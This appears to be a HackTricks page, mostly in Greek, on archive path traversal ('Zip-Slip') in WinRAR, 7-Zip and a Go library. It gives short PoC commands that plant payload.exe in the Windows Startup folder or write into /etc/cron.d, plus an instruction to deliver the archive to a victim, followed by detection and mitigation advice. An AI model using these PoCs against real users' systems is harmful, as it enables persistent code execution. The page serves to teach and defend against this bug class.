# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Επισκόπηση

Πολλές μορφές αρχείων συμπίεσης (ZIP, RAR, TAR, 7-ZIP, κ.λπ.) επιτρέπουν σε κάθε εγγραφή να φέρει τη δική της **εσωτερική διαδρομή**. Όταν ένα εργαλείο εξαγωγής εφαρμόζει χωρίς έλεγχο αυτή τη διαδρομή, ένα κατασκευασμένο όνομα αρχείου που περιέχει `..` ή μια **απόλυτη διαδρομή** (π.χ. `C:\Windows\System32\`) θα γραφτεί εκτός του καταλόγου που επέλεξε ο χρήστης.
Αυτή η κατηγορία ευπάθειας είναι ευρέως γνωστή ως *Zip-Slip* ή **archive extraction path traversal**.

Οι συνέπειες κυμαίνονται από την υπεργραφή αυθαίρετων αρχείων έως την άμεση επίτευξη **remote code execution (RCE)**, τοποθετώντας ένα payload σε μια **auto-run** τοποθεσία, όπως ο φάκελος *Startup* των Windows.

## Βασική αιτία

1. Ο επιτιθέμενος δημιουργεί ένα αρχείο όπου ένα ή περισσότερα headers αρχείων περιέχουν:
* Σχετικές ακολουθίες διαφυγής (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Απόλυτες διαδρομές (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Ή κατασκευασμένα **symlinks** που επιλύονται έξω από τον στοχευμένο κατάλογο (συνήθη σε ZIP/TAR σε *nix*).
2. Το θύμα εξάγει το αρχείο με ένα ευάλωτο εργαλείο που εμπιστεύεται την ενσωματωμένη διαδρομή (ή ακολουθεί symlinks) αντί να την εξυγιάνει ή να επιβάλει την εξαγωγή κάτω από τον επιλεγμένο κατάλογο.
3. Το αρχείο γράφεται στην τοποθεσία που ελέγχεται από τον επιτιθέμενο και εκτελείται/φορτώνεται την επόμενη φορά που το σύστημα ή ο χρήστης ενεργοποιεί αυτή τη διαδρομή.

## Πραγματικό Παράδειγμα – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows (including the `rar` / `unrar` CLI, the DLL and the portable source) failed to validate filenames during extraction.
A malicious RAR archive containing an entry such as:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
θα κατέληγε **εκτός** του επιλεγμένου καταλόγου εξόδου και μέσα στο *Startup* φάκελο του χρήστη. Μετά τη σύνδεση, τα Windows εκτελούν αυτόματα ό,τι υπάρχει εκεί, παρέχοντας *επίμονη* RCE.

### Δημιουργία ενός PoC Archive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – αποθηκεύει τα μονοπάτια αρχείων ακριβώς όπως δίνονται (μην **αφαιρείτε** το αρχικό `./`).

Deliver `evil.rar` to the victim and instruct them to extract it with a vulnerable WinRAR build.

### Παρατηρημένη εκμετάλλευση στο πεδίο

ESET reported RomCom (Storm-0978/UNC2596) spear-phishing campaigns that attached RAR archives abusing CVE-2025-8088 to deploy customised backdoors and facilitate ransomware operations.

## Πιο πρόσφατες περιπτώσεις (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Σφάλμα**: ZIP entries that are **symbolic links** were dereferenced during extraction, letting attackers escape the destination directory and overwrite arbitrary paths. User interaction is just *opening/extracting* the archive.
* **Επηρεαζόμενα**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **Επίπτωση**: Overwrite `Start Menu/Programs/Startup` or service-run locations → code runs at next logon or service restart.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Σε επιδιορθωμένη έκδοση το `/etc/cron.d` δεν θα πειραχτεί· το symlink εξάγεται ως σύνδεσμος μέσα στο `/tmp/target`.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Σφάλμα**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
* **Επηρεαζόμενα**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
* **Διόρθωση**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
* **Ελάχιστη αναπαραγωγή**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Συμβουλές ανίχνευσης

* **Στατική επιθεώρηση** – List archive entries and flag any name containing `../`, `..\\`, *απόλυτα μονοπάτια* (`/`, `C:`) ή εγγραφές τύπου *symlink* των οποίων ο στόχος βρίσκεται έξω από τον κατάλογο εξαγωγής.
* **Canonicalisation** – Ensure `realpath(join(dest, name))` still starts with `dest`. Reject otherwise.
* **Απομόνωση εξαγωγής** – Αποσυμπιέστε σε έναν προσωρινό κατάλογο χρησιμοποιώντας έναν *ασφαλή* extractor (π.χ., `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) και επαληθεύστε ότι τα προκύπτοντα μονοπάτια παραμένουν εντός του καταλόγου.
* **Endpoint monitoring** – Alert on new executables written to `Startup`/`Run`/`cron` locations shortly after an archive is opened by WinRAR/7-Zip/etc.

## Μετριασμός & Σκληρυνση

1. **Ενημερώστε το εργαλείο εξαγωγής** – WinRAR 7.13+ και 7-Zip 25.00+ εφαρμόζουν εξυγίανση μονοπατιών/symlink. Και τα δύο εργαλεία εξακολουθούν να μην διαθέτουν αυτόματες ενημερώσεις.
2. Extract archives with “**Do not extract paths**” / “**Ignore paths**” when possible.
3. Σε Unix, μειώστε τα προνόμια & προσαρτήστε ένα **chroot/namespace** πριν την εξαγωγή· σε Windows, χρησιμοποιήστε **AppContainer** ή ένα sandbox.
4. Εάν γράφετε προσαρμοσμένο κώδικα, κανονικοποιήστε με `realpath()`/`PathCanonicalize()` **πριν** τη δημιουργία/εγγραφή, και απορρίψτε οποιαδήποτε εγγραφή διαφεύγει του προορισμού.

## Επιπλέον επηρεαζόμενες / Ιστορικές περιπτώσεις

* 2018 – Μεγάλη ειδοποίηση *Zip-Slip* από τη Snyk που επηρέασε πολλές βιβλιοθήκες Java/Go/JS.
* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Οποιαδήποτε προσαρμοσμένη λογική εξαγωγής που δεν καλεί `PathCanonicalize` / `realpath` πριν την εγγραφή.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)

{{#include ../banners/hacktricks-training.md}}
